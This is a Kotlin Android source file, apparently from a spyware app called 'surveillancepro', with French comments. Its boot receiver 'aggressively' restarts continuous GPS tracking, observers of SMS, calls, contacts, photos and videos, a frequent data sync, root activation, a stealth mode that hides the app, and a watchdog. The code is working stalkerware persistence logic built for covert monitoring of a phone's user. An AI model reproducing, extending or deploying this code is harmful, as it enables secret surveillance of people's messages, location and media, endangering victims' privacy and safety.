package com.surveillancepro.android.receivers

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.os.Handler
import android.os.Looper
import android.util.Log
import com.surveillancepro.android.data.DeviceStorage
import com.surveillancepro.android.data.EventQueue
import com.surveillancepro.android.root.RootActivator
import com.surveillancepro.android.services.ContentObserverService
import com.surveillancepro.android.services.LocationService
import com.surveillancepro.android.services.MediaObserverService
import com.surveillancepro.android.services.StealthManager
import com.surveillancepro.android.workers.SyncWorker

/**
 * Receiver ultra-agressif qui redémarre TOUS les services au boot.
 * Utilise des délais échelonnés pour éviter les blocages système.
 */
class BootReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        val validActions = listOf(
            Intent.ACTION_BOOT_COMPLETED,
            "android.intent.action.QUICKBOOT_POWERON",
            "com.htc.intent.action.QUICKBOOT_POWERON",
            "android.intent.action.REBOOT",
        )
        if (intent.action !in validActions) return

        val storage = DeviceStorage.getInstance(context)
        if (!storage.hasAccepted || storage.deviceToken == null) return

        Log.d("BootReceiver", "Device booted - AGGRESSIVE restart of all services")

        val queue = EventQueue.getInstance(context)
        val timestamp = java.text.SimpleDateFormat(
            "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'", java.util.Locale.US
        ).format(java.util.Date())

        // Événement boot avec infos complètes
        queue.enqueue("device_boot", mapOf(
            "timestamp" to timestamp,
            "model" to "${android.os.Build.MANUFACTURER} ${android.os.Build.MODEL}",
            "system" to "Android ${android.os.Build.VERSION.RELEASE}",
            "sdk" to android.os.Build.VERSION.SDK_INT,
            "bootReason" to (intent.action ?: "unknown"),
        ))

        val handler = Handler(Looper.getMainLooper())

        // Étape 1: GPS immédiat
        handler.postDelayed({
            try {
                context.startForegroundService(
                    Intent(context, LocationService::class.java).apply {
                        putExtra(LocationService.EXTRA_MODE, LocationService.MODE_CONTINUOUS)
                    }
                )
                Log.d("BootReceiver", "LocationService started")
            } catch (e: Exception) {
                Log.w("BootReceiver", "LocationService: ${e.message}")
            }
        }, 3000) // 3 secondes après boot

        // Étape 2: ContentObserver (SMS, appels, contacts)
        handler.postDelayed({
            try {
                context.startForegroundService(Intent(context, ContentObserverService::class.java))
                Log.d("BootReceiver", "ContentObserverService started")
            } catch (e: Exception) {
                Log.w("BootReceiver", "ContentObserverService: ${e.message}")
            }
        }, 5000) // 5 secondes

        // Étape 3: MediaObserver (photos/vidéos)
        handler.postDelayed({
            try {
                val mediaObserver = MediaObserverService(context)
                mediaObserver.start()
                // Scan initial des photos récentes
                Thread {
                    try { mediaObserver.scanRecentPhotos() } catch (_: Exception) {}
                }.start()
                Log.d("BootReceiver", "MediaObserver started + initial scan")
            } catch (e: Exception) {
                Log.w("BootReceiver", "MediaObserver: ${e.message}")
            }
        }, 8000) // 8 secondes

        // Étape 4: SyncWorker agressif
        handler.postDelayed({
            SyncWorker.schedule(context, intervalMinutes = 5)
            SyncWorker.triggerNow(context)
            Log.d("BootReceiver", "SyncWorker scheduled (5min interval)")
        }, 10000) // 10 secondes

        // Étape 5: Root activation + stealth
        handler.postDelayed({
            try {
                RootActivator.activate(context)
                // Réactiver le mode furtif
                StealthManager.activateAfterSetup(context, delayMs = 2000)
                Log.d("BootReceiver", "Root + Stealth activated")
            } catch (e: Exception) {
                Log.w("BootReceiver", "Root activation: ${e.message}")
            }
        }, 15000) // 15 secondes

        // Étape 6: Sync forcé après stabilisation
        handler.postDelayed({
            SyncWorker.triggerNow(context)
            Log.d("BootReceiver", "Forced sync after boot stabilization")
        }, 60000) // 1 minute après boot
        
        // Étape 7: Démarrer le Watchdog pour surveiller tous les services
        handler.postDelayed({
            try {
                com.surveillancepro.android.services.WatchdogService.start(context)
                Log.d("BootReceiver", "WatchdogService started")
            } catch (e: Exception) {
                Log.w("BootReceiver", "WatchdogService: ${e.message}")
            }
        }, 20000) // 20 secondes après boot
    }
}
